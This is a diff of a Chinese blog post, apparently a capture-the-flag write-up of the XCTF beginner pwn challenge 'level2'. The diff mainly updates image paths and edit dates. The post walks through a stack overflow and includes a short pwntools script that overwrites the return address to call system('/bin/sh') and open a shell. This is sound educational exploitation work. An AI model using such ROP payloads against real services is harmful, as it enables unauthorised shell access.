@@ -27,21 +27,21 @@
 <meta property="og:site_name" content="lightyami&#39;s blogs">
 <meta property="og:description" content="攻防世界pwn题目 新手练习区level2 1.下载附件 2.使用IDA PRO打开，F5生成伪代码 3.分析程序 进入第一个函数发现存在栈溢出漏洞(程序未对用户输入做检查)  此时考虑利用栈溢出，覆盖返回地址，调用system(“&#x2F;bin&#x2F;sh”); 在string中找到了‘bin&#x2F;sh’字符，于是考虑使用ROP面向返回的编程技术，构造system(“&#x2F;bin&#x2F;sh”)命令，因为system和&#x2F;">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://wai-whoami.github.io/level2/level2/1.png">
-<meta property="og:image" content="https://wai-whoami.github.io/level2/level2/2.png">
-<meta property="og:image" content="https://wai-whoami.github.io/level2/level2/3.png">
-<meta property="og:image" content="https://wai-whoami.github.io/level2/level2/4.png">
-<meta property="og:image" content="https://wai-whoami.github.io/level2/level2/5.png">
-<meta property="og:image" content="https://wai-whoami.github.io/level2/level2/6.png">
-<meta property="og:image" content="https://wai-whoami.github.io/level2/level2/7.png">
-<meta property="og:image" content="https://wai-whoami.github.io/level2/level2/8.png">
-<meta property="og:image" content="https://wai-whoami.github.io/level2/level2/9.png">
-<meta property="og:image" content="https://wai-whoami.github.io/level2/level2/10.png">
+<meta property="og:image" content="https://wai-whoami.github.io/images/level2/1.png">
+<meta property="og:image" content="https://wai-whoami.github.io/images/level2/2.png">
+<meta property="og:image" content="https://wai-whoami.github.io/images/level2/3.png">
+<meta property="og:image" content="https://wai-whoami.github.io/images/level2/4.png">
+<meta property="og:image" content="https://wai-whoami.github.io/images/level2/5.png">
+<meta property="og:image" content="https://wai-whoami.github.io/images/level2/6.png">
+<meta property="og:image" content="https://wai-whoami.github.io/images/level2/7.png">
+<meta property="og:image" content="https://wai-whoami.github.io/images/level2/8.png">
+<meta property="og:image" content="https://wai-whoami.github.io/images/level2/9.png">
+<meta property="og:image" content="https://wai-whoami.github.io/images/level2/10.png">
 <meta property="article:published_time" content="2020-09-08T13:53:42.523Z">
-<meta property="article:modified_time" content="2020-09-08T13:53:01.933Z">
+<meta property="article:modified_time" content="2020-10-12T12:06:56.979Z">
 <meta property="article:author" content="lightyami">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://wai-whoami.github.io/level2/level2/1.png">
+<meta name="twitter:image" content="https://wai-whoami.github.io/images/level2/1.png">
 
 <link rel="canonical" href="https://wai-whoami.github.io/level2/">
 
@@ -183,10 +183,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              
 
-              <time title="Created: 2020-09-08 21:53:42 / Modified: 21:53:01" itemprop="dateCreated datePublished" datetime="2020-09-08T21:53:42+08:00">2020-09-08</time>
+              <time title="Created: 2020-09-08 21:53:42" itemprop="dateCreated datePublished" datetime="2020-09-08T21:53:42+08:00">2020-09-08</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-10-12 20:06:56" itemprop="dateModified" datetime="2020-10-12T20:06:56+08:00">2020-10-12</time>
+              </span>
 
           
 
@@ -200,27 +206,27 @@
 
       
         <p>攻防世界pwn题目 <a href="https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5055&page=1" target="_blank" rel="noopener">新手练习区level2</a></p>
-<h3 id="1-下载附件"><a href="#1-下载附件" class="headerlink" title="1.下载附件"></a>1.下载附件</h3><p><img src="./level2/1.png" alt="Alt text" title="Optional title"></p>
-<h3 id="2-使用IDA-PRO打开，F5生成伪代码"><a href="#2-使用IDA-PRO打开，F5生成伪代码" class="headerlink" title="2.使用IDA PRO打开，F5生成伪代码"></a>2.使用IDA PRO打开，F5生成伪代码</h3><p><img src="./level2/2.png" alt="Alt text" title="Optional title"></p>
-<h3 id="3-分析程序"><a href="#3-分析程序" class="headerlink" title="3.分析程序"></a>3.分析程序</h3><p><img src="./level2/3.png" alt="Alt text" title="Optional title"></p>
+<h3 id="1-下载附件"><a href="#1-下载附件" class="headerlink" title="1.下载附件"></a>1.下载附件</h3><p><img src="/images/level2/1.png" alt="Alt text" title="Optional title"></p>
+<h3 id="2-使用IDA-PRO打开，F5生成伪代码"><a href="#2-使用IDA-PRO打开，F5生成伪代码" class="headerlink" title="2.使用IDA PRO打开，F5生成伪代码"></a>2.使用IDA PRO打开，F5生成伪代码</h3><p><img src="/images/level2/2.png" alt="Alt text" title="Optional title"></p>
+<h3 id="3-分析程序"><a href="#3-分析程序" class="headerlink" title="3.分析程序"></a>3.分析程序</h3><p><img src="/images/level2/3.png" alt="Alt text" title="Optional title"></p>
 <p>进入第一个函数发现存在栈溢出漏洞(程序未对用户输入做检查)</p>
-<p><img src="./level2/4.png" alt="Alt text" title="Optional title"></p>
+<p><img src="/images/level2/4.png" alt="Alt text" title="Optional title"></p>
 <p>此时考虑利用栈溢出，覆盖返回地址，调用system(“/bin/sh”);</p>
 <p>在string中找到了‘bin/sh’字符，于是考虑使用<br><strong><em>ROP</em></strong>面向返回的编程技术，构造<br><strong>system(“/bin/sh”)</strong><br>命令，因为system和/bin/sh都是程序内部的对象，所以利用面较为广泛</p>
-<p><img src="./level2/5.png" alt="Alt text" title="Optional title"></p>
+<p><img src="/images/level2/5.png" alt="Alt text" title="Optional title"></p>
 <p>寻找system函数地址</p>
-<p><img src="./level2/6.png" alt="Alt text" title="Optional title"></p>
+<p><img src="/images/level2/6.png" alt="Alt text" title="Optional title"></p>
 <p>进入查看，指令实参存储的偏移地址</p>
-<p><img src="./level2/7.png" alt="Alt text" title="Optional title"></p>
+<p><img src="/images/level2/7.png" alt="Alt text" title="Optional title"></p>
 <h4 id="整体思路"><a href="#整体思路" class="headerlink" title="整体思路"></a>整体思路</h4><p>利用ROP技术，构造调用系统的/bin/sh，进入系统shell，再来寻找flag</p>
 <h3 id="4-编写payload"><a href="#4-编写payload" class="headerlink" title="4.编写payload"></a>4.编写payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; remote(&#39;ip&#x2F;url&#39;,port)</span><br><span class="line">p.send(&#39;a&#39;*140+p32(0x08048320)+&#39;a&#39;*4+p32(0x0804a024))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 <h3 id="5-开始解题"><a href="#5-开始解题" class="headerlink" title="5.开始解题"></a>5.开始解题</h3><p>获取在线场景</p>
-<p><img src="./level2/8.png" alt="Alt text" title="Optional title"></p>
+<p><img src="/images/level2/8.png" alt="Alt text" title="Optional title"></p>
 <p>编写脚本</p>
-<p><img src="./level2/9.png" alt="Alt text" title="Optional title"></p>
+<p><img src="/images/level2/9.png" alt="Alt text" title="Optional title"></p>
 <p>执行脚本，查看flag</p>
-<p><img src="./level2/10.png" alt="Alt text" title="Optional title"></p>
+<p><img src="/images/level2/10.png" alt="Alt text" title="Optional title"></p>
 
     </div>
 
